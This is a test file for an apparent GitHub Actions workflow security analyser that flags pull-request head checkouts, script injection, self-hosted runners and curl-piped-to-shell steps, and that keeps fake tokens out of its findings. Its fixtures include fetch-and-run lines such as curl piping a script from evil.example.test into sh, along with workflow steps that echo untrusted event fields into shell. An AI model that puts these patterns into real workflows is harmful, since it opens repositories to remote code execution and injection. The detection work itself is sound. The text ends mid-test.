import { describe, expect, it } from "vitest";
import { supplyChainFacts } from "../src/supplyChain.js";
import { parseExpression } from "../src/workflowExpressions.js";
import {
  ALL_WORLDS,
  BASE_RUN_WORLD,
  HEAD_WORLDS,
  NO_REACH_HASH,
  PRIVILEGED_WORLDS,
  PULL_REQUEST_WORLDS,
  WORLDS,
  blankStrings,
  shortHash,
  worldsNamed,
  type WorldName,
  type WorldSet,
} from "../src/workflowReach.js";
import { conditionAt, listValue, rowsOf, structureOf } from "../src/workflowRows.js";
import { PROPORTIONAL, growth } from "./growth.js";
import { WORKFLOW_PATH, chainFacts, file, withPermissions, workflowFacts } from "./security.js";

const SHA = "a".repeat(40);
const HEAD = "ref: ${{ github.event.workflow_run.head_sha }}";
const pad = (n: number) => String(n).padStart(2, "0");
const run = (files: [string, string][]) =>
  chainFacts({ paths: files.map(([path]) => path), workflows: files.map(([path, content]) => file(path, content)) });
const heads = (files: [string, string][]) => run(files).findings.filter((f) => f.risk === "prHeadCheckout");

/** A reusable workflow that checks out the head of the run that started its caller. */
const callee = [
  "on: workflow_call",
  "permissions: {}",
  "jobs:",
  "  migrate:",
  "    runs-on: ubuntu-latest",
  "    steps:",
  `      - uses: actions/checkout@${SHA}`,
  "        with:",
  "          persist-credentials: false",
  `          ${HEAD}`,
  "",
].join("\n");
const calling = (target: string, on = "workflow_run:\n    workflows: [CI]", condition = "") =>
  `on:\n  ${on}\npermissions: {}\njobs:\n  call:\n${condition}    uses: ${target}\n`;

describe("caps on routes and hops", () => {
  it("keeps 20 routed entries and one overflow entry, and shows three routes with the rest counted", () => {
    const callers = Array.from({ length: 25 }, (_, i): [string, string] => [
      `.github/workflows/c${pad(i)}.yml`,
      calling("./.github/workflows/migrate.yml"),
    ]);
    const found = heads([...callers, [".github/workflows/migrate.yml", callee]]);
    expect(found).toHaveLength(1);
    // 20 routed entries and the overflow entry survive, which is 21, and three are shown.
    expect(found[0]!.routes).toEqual([
      { trigger: "workflow_run", via: null },
      { trigger: "workflow_run", via: [{ file: ".github/workflows/c00.yml", job: "call" }] },
      { trigger: "workflow_run", via: [{ file: ".github/workflows/c01.yml", job: "call" }] },
    ]);
    expect(found[0]!.routesDropped).toBe(18);
  });

  it("reports no finding for 25 callers that each rule the event out", () => {
    const guarded = Array.from({ length: 25 }, (_, i): [string, string] => [
      `.github/workflows/c${pad(i)}.yml`,
      calling("./.github/workflows/migrate.yml", undefined, "    if: github.event.workflow_run.event == 'push'\n"),
    ]);
    expect(heads([...guarded, [".github/workflows/migrate.yml", callee]])).toEqual([]);
  });

  it("stands in for the rest of a chain past ten hops with the trigger's overflow entry", () => {
    const files: [string, string][] = Array.from({ length: 12 }, (_, i) => {
      const path = `.github/workflows/w${pad(i)}.yml`;
      if (i === 11) return [path, callee];
      return [path, calling(`./.github/workflows/w${pad(i + 1)}.yml`, i === 0 ? undefined : "workflow_call:")];
    });
    const found = heads(files);
    expect(found).toHaveLength(1);
    expect(found[0]!.routes).toEqual([{ trigger: "workflow_run", via: null }]);
    // Ten hops are followed, so the tenth file still has its exact route.
    expect(heads(files.slice(0, 11).concat([[".github/workflows/w10.yml", callee]]))[0]!.routes![0]!.via).toHaveLength(10);
  });

  it("passes an overflow entry on through further calls, and through a loop of calls once", () => {
    const a = ".github/workflows/a.yml";
    const b = ".github/workflows/b.yml";
    const files: [string, string][] = Array.from({ length: 22 }, (_, i) => [
      `.github/workflows/c${pad(i)}.yml`,
      calling(`./${a}`),
    ]);
    const loopA = `on: workflow_call\npermissions: {}\njobs:\n  next:\n    uses: ./${b}\n  self:\n    uses: ./${a}\n`;
    const loopB = `on: workflow_call\npermissions: {}\njobs:\n  back:\n    uses: ./${a}\n  head:\n    uses: ./.github/workflows/migrate.yml\n`;
    const found = heads([...files, [a, loopA], [b, loopB], [".github/workflows/migrate.yml", callee]]);
    expect(found).toHaveLength(1);
    expect(found[0]!.routes![0]).toEqual({ trigger: "workflow_run", via: null });
  });
});

describe("hostile conditions", () => {
  const withIf = (lines: string[]) =>
    [
      "on: workflow_run",
      "permissions: {}",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - if: " + lines[0],
      ...lines.slice(1).map((line) => `          ${line}`),
      `        uses: actions/checkout@${SHA}`,
      "        with:",
      "          persist-credentials: false",
      `          ${HEAD}`,
      "",
    ].join("\n");
  const conditionsOf = (yaml: string) => workflowFacts(yaml).findings.filter((f) => f.risk === "prHeadCheckout");
  const push = "github.event.workflow_run.event == 'push'";

  it("reports a condition over 2,000 characters as unreadable", () => {
    const long = [push, ...Array.from({ length: 60 }, () => "&& true && true && true && true && true && true && true && true")];
    const found = conditionsOf(withIf(long));
    expect(found).toHaveLength(1);
    expect(found[0]!.conditions![0]).toMatchObject({ verdict: "unreadable" });
  });

  it("reads 32 levels of brackets and reports 33 as unreadable", () => {
    const nest = (n: number) => `${"(".repeat(n)}${push}${")".repeat(n)}`;
    expect(conditionsOf(withIf([nest(32)]))).toEqual([]);
    const found = conditionsOf(withIf([nest(33)]));
    expect(found[0]!.conditions![0]).toMatchObject({ verdict: "unreadable" });
  });

  it("copes with unclosed wrappers, a thousand brackets and a run of quotes", () => {
    for (const hostile of ["${{ " + push, "(".repeat(1_000), "'".repeat(5)]) {
      const found = conditionsOf(withIf([hostile]));
      expect(found).toHaveLength(1);
      expect(found[0]!.conditions![0]).toMatchObject({ verdict: "unreadable" });
    }
  });

  it("reads a multi-line plain value that holds a list as unreadable", () => {
    // Without the dash the rows would read as `... == 'push' && true`, which is false in every world.
    const found = conditionsOf(withIf([push + " &&", "- true"]));
    expect(found).toHaveLength(1);
    expect(found[0]!.conditions![0]).toMatchObject({ verdict: "unreadable" });
  });

  it("reads a value that runs on past 200 rows as unreadable, because the rows not read could undo it", () => {
    // Read to 200 rows the value is `false && x && ...`, which is false, while its last row makes it true.
    const found = conditionsOf(withIf(["false", ...Array.from({ length: 205 }, () => "&& x"), "|| true"]));
    expect(found).toHaveLength(1);
    expect(found[0]!.conditions![0]).toMatchObject({ verdict: "unreadable" });
  });
});

describe("a skip along a chain of needs", () => {
  const FORK = "github.event.workflow_run.head_repository.full_name == github.repository";
  const INJECT = "      - run: echo ${{ github.event.workflow_run.head_branch }}";
  const chain = (...jobs: [id: string, needs: string | null, condition: string | null][]) =>
    [
      "on: workflow_run",
      "permissions: {}",
      "jobs:",
      ...jobs.flatMap(([id, needs, condition]) => [
        `  ${id}:`,
        ...(needs ? [`    needs: ${needs}`] : []),
        ...(condition ? [`    if: ${condition}`] : []),
        "    runs-on: ubuntu-latest",
        "    steps:",
        id === jobs[jobs.length - 1]![0] ? INJECT : "      - run: echo hi",
      ]),
      "",
    ].join("\n");
  const injections = (yaml: string) => workflowFacts(yaml).findings.filter((f) => f.risk === "scriptInjection");

  it("flags a job that needs a job running through always(), after a skipped one", () => {
    // `b` runs because of always(), so `c`, with an implicit success(), runs as well.
    expect(injections(chain(["a", null, FORK], ["b", "a", "always()"], ["c", "b", null]))).toHaveLength(1);
  });

  it("does not flag a job that needs a skipped job through a job with no condition", () => {
    expect(injections(chain(["a", null, FORK], ["b", "a", null], ["c", "b", null]))).toEqual([]);
  });

  it("flags the same job when nothing upstream is skipped", () => {
    expect(injections(chain(["b", null, null], ["c", "b", null]))).toHaveLength(1);
  });

  it("does not flag a job that needs a skipped job directly", () => {
    expect(injections(chain(["a", null, FORK], ["c", "a", null]))).toEqual([]);
  });
});

describe("the workflow_run world whose upstream run the base repository heads", () => {
  const FORK = "github.event.workflow_run.head_repository.full_name == github.repository";
  const PUSH = "github.event.workflow_run.event == 'push'";
  const checkout = (value: string) =>
    [`      - uses: actions/checkout@${SHA}`, "        with:", "          persist-credentials: false", `          ${value}`].join(
      "\n",
    );
  const guarded = (guard: string | null, steps: string) =>
    `on: workflow_run\npermissions: {}\njobs:\n  c:\n${guard ? `    if: ${guard}\n` : ""}    runs-on: ubuntu-latest\n    steps:\n${steps}\n`;
  const of = (risk: string, yaml: string) => workflowFacts(yaml).findings.filter((f) => f.risk === risk);
  const echo = (expression: string) => `      - run: echo \${{ ${expression} }}`;

  it("flags display_title behind a fork guard, because after a pull_request_target the head is the base repository", () => {
    expect(of("scriptInjection", guarded(FORK, echo("github.event.workflow_run.display_title")))).toHaveLength(1);
  });

  it.each([
    ["the fork flag", "github.event.workflow_run.head_repository.fork == false"],
    ["the owner", "github.event.workflow_run.head_repository.owner.login == github.repository_owner"],
    ["the id", "github.event.workflow_run.head_repository.id == github.repository_id"],
  ])("flags display_title behind a guard on %s, which holds when the base repository heads the run", (_, guard) => {
    const found = of("scriptInjection", guarded(guard, echo("github.event.workflow_run.display_title")));
    expect(found).toHaveLength(1);
    // The guard rules the fork-headed world out and is true in the base-headed one, which is all that is left.
    expect(found[0]!.conditions).toEqual([{ file: WORKFLOW_PATH, line: 5, text: guard, verdict: "holds" }]);
  });

  it("lets every world through the overflow route, past 25 callers that each rule the fork-headed world out", () => {
    const callers = Array.from({ length: 25 }, (_, i): [string, string] => [
      `.github/workflows/c${pad(i)}.yml`,
      calling("./.github/workflows/echo.yml", undefined, "    if: github.event.workflow_run.head_repository.fork == false\n"),
    ]);
    const echoing = (expression: string) =>
      `on: workflow_call\npermissions: {}\njobs:\n  e:\n    runs-on: ubuntu-latest\n    steps:\n${echo(expression)}\n`;
    const injections = (expression: string) =>
      run([...callers, [".github/workflows/echo.yml", echoing(expression)]]).findings.filter((f) => f.risk === "scriptInjection");
    const title = injections("github.event.workflow_run.display_title");
    expect(title).toHaveLength(1);
    // 20 routes followed and the overflow route, of which three are shown.
    expect(title[0]!.routes![0]).toEqual({ trigger: "workflow_run", via: null });
    expect(title[0]!.routesDropped).toBe(18);
    // Each route followed carries only the base-headed world, which head_branch leaves out, so only the overflow reaches it.
    const branch = injections("github.event.workflow_run.head_branch");
    expect(branch).toHaveLength(1);
    expect(branch[0]!.routes).toEqual([{ trigger: "workflow_run", via: null }]);
    expect(branch[0]).not.toHaveProperty("routesDropped");
  });

  it.each([
    "github.event.workflow_run.head_branch",
    "github.event.workflow_run.head_commit.message",
    "github.event.workflow_run.head_commit.author.name",
  ])("does not flag %s behind a fork guard, because only a pull_request run gives it to an outsider", (expression) => {
    expect(of("scriptInjection", guarded(FORK, echo(expression)))).toEqual([]);
  });

  it.each(["github.event.workflow_run.head_branch", "github.event.workflow_run.display_title"])(
    "flags %s with no guard",
    (expression) => {
      expect(of("scriptInjection", guarded(null, echo(expression)))).toHaveLength(1);
    },
  );

  it.each([
    ["head_branch", "github.event.workflow_run.head_branch"],
    ["display_title", "github.event.workflow_run.display_title"],
  ])("closes both worlds for %s when the guard needs a push", (_, expression) => {
    expect(of("scriptInjection", guarded(PUSH, echo(expression)))).toEqual([]);
  });

  it.each(["ref: ${{ github.event.workflow_run.head_sha }}", "ref: ${{ github.event.workflow_run.head_branch }}"])(
    "does not flag a checkout of `%s` behind a fork guard",
    (value) => {
      expect(of("prHeadCheckout", guarded(FORK, checkout(value)))).toEqual([]);
    },
  );

  it.each([
    "ref: ${{ github.event.workflow_run.pull_requests[0].head.sha }}",
    "repository: ${{ github.event.workflow_run.head_repository.full_name }}",
  ])("flags a checkout of `%s` behind a fork guard, because both worlds reach it", (value) => {
    expect(of("prHeadCheckout", guarded(FORK, checkout(value)))).toHaveLength(1);
  });

  it("flags a head_sha checkout with no guard, and clears it for a push guard", () => {
    const value = "ref: ${{ github.event.workflow_run.head_sha }}";
    expect(of("prHeadCheckout", guarded(null, checkout(value)))).toHaveLength(1);
    expect(of("prHeadCheckout", guarded(PUSH, checkout(value)))).toEqual([]);
  });

  it("reads a command that names both kinds of reference by the one that reaches more", () => {
    const step =
      "      - run: git checkout ${{ github.event.workflow_run.head_sha }} ${{ github.event.workflow_run.pull_requests[0].head.sha }}";
    expect(of("prHeadCheckout", guarded(FORK, step))).toHaveLength(1);
    expect(of("prHeadCheckout", guarded(FORK, "      - run: git checkout ${{ github.event.workflow_run.head_sha }}"))).toEqual(
      [],
    );
  });

  it("keeps a head_sha finding for a pull_request_target workflow, whose own head is the outsider's", () => {
    const yaml = withPermissions("on: pull_request_target", checkout("ref: ${{ github.event.workflow_run.head_sha }}"));
    expect(of("prHeadCheckout", yaml)).toHaveLength(1);
  });
});

describe("literals never reach stored text", () => {
  const TOKEN = "tok_S3CRET9";
  const INJECT = "        run: echo ${{ github.event.workflow_run.head_branch }}";
  const stepWith = (condition: string) =>
    workflowFacts(
      [
        "on: workflow_run",
        "permissions: {}",
        "jobs:",
        "  c:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        condition,
        INJECT,
        "",
      ].join("\n"),
    );

  it.each([
    ["a single quoted string", "x == 'tok'", "x == ''"],
    ["a doubled quote inside single quotes", "x == 'a''tok' && y", "x == '' && y"],
    ["a double quoted string", 'x == "tok" && y', "x == '' && y"],
    ["both kinds in one text", `x == "a'b" && y == 'c"d'`, "x == '' && y == ''"],
    ["an unterminated single quote", "x == 'tok && y", "x == '' ..."],
    ["an unterminated double quote", 'x == "tok && y', "x == '' ..."],
    ["a backslash inside double quotes", 'x == "a\\"tok\\" || y', "x == '' ..."],
    ["a backslash before a quote", 'x == \\"tok\\" || y', "x == '' ..."],
    ["a backslash before a closing single quote", "x == 'a\\'tok' || y", "x == '' ..."],
    ["a hash outside a string", "x == 1 # tok", "x == 1"],
    ["a hash inside a string", "x == '#tok' && y", "x == '' && y"],
    ["a hash after a string", "x == 'a' # tok 'b'", "x == ''"],
    ["spacing", "  x   ==\n 'tok'  ", "x == ''"],
  ])("blankStrings keeps nothing from %s", (_, text, expected) => {
    expect(blankStrings(text)).toBe(expected);
    expect(blankStrings(text)).not.toContain("tok");
  });

  it.each([
    ["a single quoted literal", `      - if: github.actor == '${TOKEN}' || github.event.workflow_run.event == 'push'`],
    [
      "an escaped double quote in a double quoted value",
      `      - if: "github.event.workflow_run.head_branch == \\"${TOKEN}\\" || github.actor == 'x'"`,
    ],
    ["an unterminated single quote", `      - if: github.actor == '${TOKEN}`],
    ["an unterminated double quote", `      - if: github.actor == "${TOKEN}`],
    ["a hash line in a block scalar", `      - if: |\n          github.actor == 'x' # ${TOKEN}`],
    ["a hash line of its own in a block scalar", `      - if: |\n          github.actor == 'x'\n          # ${TOKEN}`],
    ["a hash after a plain value", `      - if: github.actor == 'x' # ${TOKEN}`],
    ["a folded block", `      - if: >-\n          github.actor == '${TOKEN}'\n          || x`],
    [
      "a backslash before a closing single quote",
      `      - if: github.actor == 'a\\'${TOKEN}' || github.event.workflow_run.event == 'push'`,
    ],
  ])("keeps a token out of the facts for %s in a step condition", (_, condition) => {
    const facts = stepWith(condition);
    expect(facts.findings.some((f) => f.risk === "scriptInjection")).toBe(true);
    expect(JSON.stringify(facts)).not.toContain(TOKEN);
  });

  it("stores an outer double quote that holds an escaped quote as a marker and nothing after it", () => {
    const facts = stepWith(`      - if: "github.event.workflow_run.head_branch == \\"${TOKEN}\\" || github.actor == 'x'"`);
    const found = facts.findings.find((f) => f.risk === "scriptInjection")!;
    expect(found.conditions).toEqual([{ file: WORKFLOW_PATH, line: 7, text: "'' ...", verdict: "unreadable" }]);
  });

  it("stores the text of a block scalar without its hash line, which the reader cannot parse", () => {
    const facts = stepWith(`      - if: |\n          github.actor == 'x' # ${TOKEN}`);
    expect(facts.findings.find((f) => f.risk === "scriptInjection")!.conditions).toEqual([
      { file: WORKFLOW_PATH, line: 7, text: "github.actor == ''", verdict: "unreadable" },
    ]);
  });

  it("keeps a token out of a job condition", () => {
    const yaml = [
      "on: workflow_run",
      "permissions: {}",
      "jobs:",
      "  c:",
      `    if: "github.actor == \\"${TOKEN}\\" || always()"`,
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: echo ${{ github.event.workflow_run.head_branch }}",
      "",
    ].join("\n");
    const facts = workflowFacts(yaml);
    expect(facts.findings.some((f) => f.risk === "scriptInjection")).toBe(true);
    expect(JSON.stringify(facts)).not.toContain(TOKEN);
  });

  it("keeps a token out of the condition of a calling job, listed in a callee's finding", () => {
    const caller = [
      "on: workflow_run",
      "permissions: {}",
      "jobs:",
      "  call:",
      `    if: always() && github.actor != '${TOKEN}  # ${TOKEN}`,
      "    uses: ./.github/workflows/migrate.yml",
      "",
    ].join("\n");
    const facts = run([
      [".github/workflows/caller.yml", caller],
      [".github/workflows/migrate.yml", callee],
    ]);
    expect(facts.findings.some((f) => f.risk === "prHeadCheckout")).toBe(true);
    expect(JSON.stringify(facts)).not.toContain(TOKEN);
  });

  it.each([
    ["a literal in the expression", `echo \${{ github.event.issue.title + '${TOKEN}' }}`],
    ["an unterminated literal in the expression", `echo \${{ github.event.issue.title + '${TOKEN} }}`],
    ["a double quoted literal in the expression", `echo \${{ github.event.issue.title + "${TOKEN}" }}`],
    ["a hash in the expression", `echo \${{ github.event.issue.title # ${TOKEN} }}`],
    ["a backslash before a closing single quote", `echo \${{ github.event.issue.title || 'a\\'${TOKEN}' }}`],
  ])("keeps a token out of script injection evidence for %s", (_, line) => {
    const facts = workflowFacts(withPermissions("on: issue_comment", `      - run: ${line}`));
    const found = facts.findings.filter((f) => f.risk === "scriptInjection");
    expect(found).toHaveLength(1);
    expect(JSON.stringify(facts)).not.toContain(TOKEN);
  });

  it("keeps a token out of a pull request reference that holds an expression", () => {
    const yaml = withPermissions("on: pull_request_target", `      - run: git fetch origin pull/\${{ '${TOKEN}' }}/head`);
    const found = workflowFacts(yaml).findings.filter((f) => f.risk === "prHeadCheckout");
    expect(found).toHaveLength(1);
    expect(JSON.stringify(found)).not.toContain(TOKEN);
  });
});

describe("growth", () => {
  const manyJobs = (jobs: number) =>
    [
      "on: pull_request",
      "permissions: {}",
      "jobs:",
      ...Array.from({ length: jobs }, (_, i) => [
        `  j${i}:`,
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - run: echo hi",
      ]).flat(),
      "",
    ].join("\n");

  it("finds the steps of many jobs in proportion to their number", () => {
    expect(growth((yaml: string) => structureOf(rowsOf(yaml)), manyJobs(1_250), manyJobs(5_000))).toBeLessThan(PROPORTIONAL);
  });

  const needsChain = (jobs: number) =>
    [
      "on: pull_request",
      "permissions: {}",
      "jobs:",
      ...Array.from({ length: jobs }, (_, i) => [
        `  j${i}:`,
        ...(i > 0 ? [`    needs: [j${i - 1}]`] : []),
        "    if: github.event_name == 'pull_request'",
        "    runs-on: self-hosted",
        "    steps:",
        "      - run: echo hi",
      ]).flat(),
      "",
    ].join("\n");

  it("reads a long chain of needs in proportion to its length", () => {
    expect(growth((yaml: string) => workflowFacts(yaml), needsChain(500), needsChain(2_000))).toBeLessThan(PROPORTIONAL);
  });

  const manySteps = (steps: number) =>
    [
      "on: pull_request_target",
      "permissions: {}",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      ...Array.from({ length: steps }, () => [
        "      - if: github.event_name != 'issues'",
        "        with:",
        "          ref: ${{ github.event.pull_request.head.sha }}",
      ]).flat(),
      "",
    ].join("\n");

  it("reads many guarded steps in proportion to their number", () => {
    expect(growth((yaml: string) => workflowFacts(yaml), manySteps(1_250), manySteps(5_000))).toBeLessThan(PROPORTIONAL);
  });

  it("evaluates one step's guard once however many lines match in it", () => {
    const matches = (lines: number) =>
      [
        "on: pull_request_target",
        "permissions: {}",
        "jobs:",
        "  build:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - if: github.event_name != 'issues'",
        "        run: |",
        ...Array.from({ length: lines }, () => "          git checkout ${{ github.event.pull_request.head.sha }}"),
        "",
      ].join("\n");
    expect(growth((yaml: string) => workflowFacts(yaml), matches(1_000), matches(4_000))).toBeLessThan(PROPORTIONAL);
  });
});

describe("shortHash and lineHash", () => {
  it.each([
    ["", "cbf29ce484222325"],
    ["a", "af63dc4c8601ec8c"],
    ["foobar", "85944171f73967e8"],
  ])("matches the FNV-1a 64 reference vector for %j", (text, expected) => {
    expect(shortHash(text)).toBe(expected);
  });

  it("hashes characters above one byte without throwing and tells them apart", () => {
    expect(shortHash("é")).not.toBe(shortHash("e"));
    expect(shortHash("é")).toMatch(/^[0-9a-f]{16}$/);
  });

  const piped = (line: string, above = "") =>
    workflowFacts(
      `on: push\npermissions: {}\njobs:\n  b:\n    runs-on: ubuntu-latest\n${above}    steps:\n      - run: ${line}\n`,
    );
  const hashOf = (facts: ReturnType<typeof piped>) => facts.findings.find((f) => f.risk === "curlPipeShell")!.lineHash;

  it("ignores spacing, and follows any other change to the line, a quoted literal included", () => {
    const base = hashOf(piped("curl -H 'X: one' https://example.test/a | bash"));
    expect(base).toMatch(/^[0-9a-f]{16}$/);
    expect(hashOf(piped("curl   -H 'X: one'  https://example.test/a | bash"))).toBe(base);
    expect(hashOf(piped("curl -H 'X: two' https://example.test/a | bash"))).not.toBe(base);
    expect(hashOf(piped("curl -H 'X: one' https://example.test/b | bash"))).not.toBe(base);
  });

  it("changes when the address inside double quotes changes, so an acceptance reopens", () => {
    const at = (url: string) => hashOf(piped(`curl -fsSL "${url}" | sh`));
    expect(at("https://good.example.test/x.sh")).not.toBe(at("https://evil.example.test/x.sh"));
  });

  it("keeps the hash when a comment is added above the line", () => {
    const base = hashOf(piped("curl https://example.test/a | bash"));
    expect(hashOf(piped("curl https://example.test/a | bash", "    # a note\n"))).toBe(base);
  });

  it("never stores a token written in a quoted string on a flagged line", () => {
    const facts = piped("curl -H 'Authorization: tok_SECRET123' https://example.test/a | bash");
    expect(JSON.stringify(facts)).not.toContain("tok_SECRET123");
  });

  it("hashes the sorted ids of the jobs without permissions when a finding has no line", () => {
    const yaml = (first: string, second: string) =>
      `on: push\njobs:\n  ${first}:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n  ${second}:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n`;
    const hash = (text: string) => workflowFacts(text).findings.find((f) => f.risk === "noPermissions")!.lineHash;
    expect(hash(yaml("beta", "alpha"))).toBe(hash(yaml("alpha", "beta")));
    expect(hash(yaml("alpha", "gamma"))).not.toBe(hash(yaml("alpha", "beta")));
  });
});

describe("structure of a workflow", () => {
  const rows = (text: string) => rowsOf(text);

  it("finds jobs, steps and their conditions", () => {
    const text = [
      "on: push",
      "jobs:",
      "  build:",
      "    needs: [a, 'b']",
      "    if: github.ref == 'x'",
      "    steps:",
      "      - uses: x",
      "      - name: y",
      "        if: github.ref == 'y'",
      "  a:",
      "    steps:",
      "    - if: false",
      "      run: echo",
    ].join("\n");
    const parsed = rows(text);
    const structure = structureOf(parsed);
    expect(structure.jobs.map((job) => [job.id, job.needs, job.condition?.text ?? null])).toEqual([
      ["build", ["a", "b"], "github.ref == 'x'"],
      ["a", [], null],
    ]);
    expect(structure.steps.map((step) => [step.job, step.condition?.text ?? null])).toEqual([
      [0, null],
      [0, "github.ref == 'y'"],
      [1, "false"],
    ]);
    expect(structure.jobOf[parsed.length - 1]).toBe(1);
    expect(structure.stepOf[0]).toBe(-1);
  });

  it("finds the steps of a composite action under runs", () => {
    const structure = structureOf(rows("runs:\n  using: composite\n  steps:\n    - if: false\n      run: echo\n    - run: echo"));
    expect(structure.jobs).toEqual([]);
    expect(structure.steps.map((step) => [step.job, step.condition?.text ?? null])).toEqual([
      [-1, "false"],
      [-1, null],
    ]);
  });

  it("copes with a file with no jobs, an empty jobs key, and runs with no steps", () => {
    expect(structureOf(rows("on: push")).jobs).toEqual([]);
    expect(structureOf(rows("jobs:\n")).jobs).toEqual([]);
    expect(structureOf(rows("jobs:\n  a:\n")).jobs.map((job) => job.id)).toEqual(["a"]);
    expect(structureOf(rows("runs:\n  using: node20")).steps).toEqual([]);
    expect(structureOf(rows("runs:\n")).steps).toEqual([]);
    expect(structureOf(rows("jobs:\n  a:\n    steps: []\n    runs-on: x")).steps).toEqual([]);
  });

  it("reads a duplicate key once and a list of steps that sits at the key's indent", () => {
    const structure = structureOf(
      rows(
        "jobs:\n  a:\n    if: false\n    if: true\n    needs: x\n    needs: y\n    steps:\n    - run: one\n    - run: two\n    runs-on: z",
      ),
    );
    expect(structure.jobs[0]).toMatchObject({ needs: ["x"] });
    expect(structure.jobs[0]!.condition!.text).toBe("false");
    expect(structure.steps).toHaveLength(2);
  });

  describe("conditionAt", () => {
    const at = (text: string) => conditionAt(rowsOf(text), 0);
    it("joins a folded block, a literal block and plain continuation lines", () => {
      expect(at("if: >-\n  a &&\n  b").text).toBe("a && b");
      expect(at("if: |\n  !a\n  && b # kept").text).toBe("!a\n&& b # kept\n");
      expect(at("if: a &&\n  b # dropped").text).toBe("a && b");
      expect(at("if: |\n").text).toBeNull();
    });

    it.each([
      ["|", "${{ x }}\n"],
      [">", "${{ x }}\n"],
      ["|+", "${{ x }}\n"],
      ["|2", "${{ x }}\n"],
      ["|-", "${{ x }}"],
      [">-", "${{ x }}"],
      ["|2-", "${{ x }}"],
    ])("keeps the final line break of a %s block unless its indicator holds a dash", (indicator, text) => {
      expect(at(`if: ${indicator}\n  \${{ x }}`).text).toBe(text);
    });

    it.each([["|"], [">"], ["|+"]])(
      "gives a wrapped expression in a %s block no reading, since GitHub sees the line break as text after it",
      (indicator) => {
        expect(parseExpression(at(`if: ${indicator}\n  \${{ x }}`).text!)).toBeNull();
      },
    );

    it.each([["|-"], [">-"]])("reads a wrapped expression in a %s block, which keeps no line break", (indicator) => {
      expect(parseExpression(at(`if: ${indicator}\n  \${{ x }}`).text!)).toEqual(parseExpression("x"));
    });

    it("keeps the spaces inside a quoted value, so a wrapper with a space beside it is not read", () => {
      expect(at('if: " ${{ x }}"').text).toBe(" ${{ x }}");
      expect(at("if: '${{ x }} '").text).toBe("${{ x }} ");
      expect(parseExpression(at('if: " ${{ x }}"').text!)).toBeNull();
      expect(parseExpression(at("if: '${{ x }} '").text!)).toBeNull();
    });

    it("gives null for a value that runs on past 200 rows, and reads one that ends at 200", () => {
      const rowsOfValue = (n: number) => `if: false\n${Array.from({ length: n }, () => "  && x").join("\n")}`;
      expect(at(`${rowsOfValue(205)}\n  || true`).text).toBeNull();
      expect(at(rowsOfValue(200)).text).toBe(`false ${Array.from({ length: 200 }, () => "&& x").join(" ")}`);
      expect(at(`${rowsOfValue(200)}\nnext: 1`).text).not.toBeNull();
    });
    it("reads quoted values", () => {
      expect(at("if: 'a ''b'' c'").text).toBe("a 'b' c");
      expect(at('if: "a b"').text).toBe("a b");
      expect(at('if: "a \\n b"').text).toBeNull();
      expect(at('if: "a" b "').text).toBeNull();
      expect(at("if: 'a").text).toBeNull();
    });
    it("gives null for a tag, an empty value, a list inside it and too much text", () => {
      expect(at("if: !a").text).toBeNull();
      expect(at("if:").text).toBeNull();
      expect(at("if: a\n  - b").text).toBeNull();
      expect(at(`if: |\n${Array.from({ length: 100 }, () => `  ${"x".repeat(50)}`).join("\n")}`).text).toBeNull();
      expect(at(`if: ${"x".repeat(1_500)}\n  ${"y".repeat(1_500)}`).text).toBeNull();
      expect(at(`if: ${"x".repeat(1_500)}\n  ${"y".repeat(1_500)}`).raw).toHaveLength(2_000);
    });
    it("keeps the line of the key", () => {
      expect(conditionAt(rowsOf("a: 1\nif: x"), 1).line).toBe(2);
    });
  });

  describe("listValue", () => {
    const list = (text: string) => listValue(rowsOf(text), 0, /^needs\s*:\s*(.*)$/.exec(rowsOf(text)[0]!.text)![1]!.trim());
    it.each([
      ["needs: a", ["a"]],
      ["needs: 'a'", ["a"]],
      ["needs: []", []],
      ["needs: [a, b]", ["a", "b"]],
      ["needs: [a,\n  b]", ["a", "b"]],
      ["needs:\n  - a\n  - 'b'", ["a", "b"]],
      ["needs:\n- a\n- b", ["a", "b"]],
      ["needs: [a, ${{ x }}]", null],
      ["needs: ${{ x }}", null],
      ["needs: [a, b", null],
      ["needs:", null],
      ["needs:\n  - ${{ x }}", null],
      ["needs:\n  key: value", null],
    ])("reads %j", (text, expected) => {
      expect(list(text)).toEqual(expected);
    });
  });
});

describe("jobs that wait on each other", () => {
  const jobs = (...lines: string[]) => ["on: pull_request", "permissions: {}", "jobs:", ...lines, ""].join("\n");
  const selfHosted = (yaml: string) => workflowFacts(yaml).findings.filter((f) => f.risk === "selfHosted");
  const job = (id: string, extra: string[] = []) => [
    `  ${id}:`,
    ...extra,
    "    runs-on: self-hosted",
    "    steps:",
    "      - run: echo",
  ];

  it("treats a cycle, a missing need and a repeated id as may run", () => {
    const cycle = jobs(...job("a", ["    needs: b"]), ...job("b", ["    needs: a"]));
    expect(selfHosted(cycle).map((f) => f.onPullRequest)).toEqual([true, true]);
    expect(selfHosted(jobs(...job("a", ["    needs: nowhere"]))).map((f) => f.onPullRequest)).toEqual([true]);
    expect(selfHosted(jobs(...job("a"), ...job("a", ["    needs: a"]))).map((f) => f.onPullRequest)).toEqual([true, true]);
  });

  it("evaluates a cyclic job's condition without trusting its needs", () => {
    const fork = "    if: github.event.pull_request.head.repo.full_name == github.repository";
    const cycle = jobs(...job("a", ["    needs: b", fork]), ...job("b", ["    needs: a"]));
    expect(selfHosted(cycle).map((f) => f.onPullRequest)).toEqual([true, true]);
  });

  it("skips a job whose need is skipped, and lists a need's condition that may hold", () => {
    const fork = "    if: github.event.pull_request.head.repo.full_name == github.repository";
    const skipped = jobs(...job("a", [fork]), ...job("b", ["    needs: a"]));
    expect(selfHosted(skipped).map((f) => f.onPullRequest)).toEqual([false, false]);
    const label = "    if: contains(github.event.pull_request.labels.*.name, 'x')";
    const maybe = jobs(...job("a", [label]), ...job("b", ["    needs: a"]));
    const second = selfHosted(maybe)[1]!;
    expect(second.onPullRequest).toBe(true);
    expect(second.conditions).toEqual([
      { file: WORKFLOW_PATH, line: 5, text: "contains(github.event.pull_request.labels.*.name, '')", verdict: "unknown" },
    ]);
  });

  it("lets a job with always() run past a skipped need", () => {
